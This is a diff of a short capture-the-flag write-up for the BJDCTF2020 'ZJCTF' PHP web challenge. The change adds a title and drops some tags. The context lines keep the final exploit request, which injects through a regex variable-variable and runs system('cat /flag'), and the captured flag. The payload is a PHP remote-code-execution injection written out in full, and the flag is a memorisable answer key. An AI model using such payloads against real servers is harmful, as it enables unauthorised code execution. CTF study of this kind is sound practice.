@@ -1,3 +1,4 @@
+# [BJDCTF2020]ZJCTF，不过如此
 ![](<./img/Pasted image 20221115160913.png>)
 ```php
 <?php
@@ -73,5 +74,3 @@ function getFlag(){
 /next.php?\S*=${getFlag()}&cmd=system('cat /flag');
 ```
 > flag{a1a7ed7e-d4a8-403c-8d74-d1da5f631dd2} system('cat /flag');
-
-#Web #PHP #function #伪协议 #RCE #正则表达式 #可变变量
